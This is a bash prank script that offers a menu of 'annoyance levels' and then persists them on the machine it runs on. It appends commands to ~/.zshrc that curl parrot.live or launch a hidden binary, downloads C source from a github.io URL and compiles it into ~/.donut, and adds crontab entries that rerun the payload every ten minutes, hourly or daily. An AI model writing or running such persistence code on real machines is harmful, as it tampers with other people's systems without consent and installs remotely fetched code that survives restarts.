function selection {
	ESC=$( printf "\033")
	cursor_to(){ printf "$ESC[$1;${2:-1}H"; }
	print_option(){ printf "   $1 "; }
	print_selected(){ printf "  $ESC[7m $1 $ESC[27m"; }
	get_cursor_row(){ IFS=';' read -sdR -p </dev/tty $'\E[6n' ROW COL; echo ${ROW#*[}; }
	key_input(){ read -s -n3 key </dev/tty 2>/dev/null >&2
					if [[ $key = $ESC[A ]]; then echo up;	fi
					if [[ $key = $ESC[B ]]; then echo down;  fi
					if [[ $key = ""	 ]]; then echo enter; fi; }
	
	for opt; do printf "\n"; done

	local current=`get_cursor_row`
	local start=$(($current - $#))

	trap "stty echo; printf '\n'; exit" 2

	local selected=0
	while true; do
		local idx=0
		for opt; do
			cursor_to $(($start + $idx))
			if [ $idx -eq $selected ]; then
				print_selected "$opt"
			else
				print_option "$opt"
			fi
			((idx++))
		done
		case `key_input` in
			enter) break;;
			up)	((selected--));
				if [ $selected -lt 0 ]; then selected=$(($# - 1)); fi;;
			down) ((selected++));
				if [ $selected -ge $# ]; then selected=0; fi;;
		esac
	done

	cursor_to $current
	return $selected
}

function select_opt {
	selection "$@" 1>&2
	local result=$?
	echo $result
	return $result
}

function normal_parrot {
	echo "echo \"curl parrot.live\" >> ~/.zshrc" > ~/.doit.sh
	bash ~/.doit.sh
}

function fixed_parrot {
	echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh
	bash ~/.doit.sh
}

function normal_donut {
	touch ~/donut
	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
	gcc ~/donut.c -o ~/donut
	echo "echo \"~/donut\" >> ~/.zshrc" > ~/.doit.sh
	bash ~/.doit.sh
}

function fixed_donut {
	touch ~/donut
	chmod 755 ~/donut
	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
	gcc ~/donut.c -o ~/.donut
	#rm ~/donut.c
	echo "echo \"~/.donut&\" >> ~/.zshrc" > ~/.doit.sh
	bash ~/.doit.sh
}

function recurring {
	echo
	echo "*** Parrot is placed in .zshrc ***"
	echo
	echo "Do you want it placed on timely intervals?"
	options2=("No, just this once"
		"once every 10 min"
		"once every hour"
		"once every day")
	case `select_opt "${options2[@]}"` in
		0) curl parrot.live ;;
		1) (crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab - ;;
		2) (crontab -l 2>/dev/null; echo "42 */1 * * * ~/.doit.sh") | crontab - ;;
		3) (crontab -l 2>/dev/null; echo "42 11 */1 * * ~/.doit.sh") | crontab - ;;
	esac
}

touch ~/.doit.sh
chmod 755 ~/.doit.sh

echo "Choose your level of annoyance:"
options=("normal parrot"
	"fixed parrot"
	"normal_donut"
	"fixed_donut"
	"cancel and exit")

case `select_opt "${options[@]}"` in 
	0)	normal_parrot 
		recurring ;;
	1)	fixed_parrot 
		recurring ;;
	2)	normal_donut
		recurring ;;
	3)	fixed_donut
		recurring ;;
	4)	;;
esac
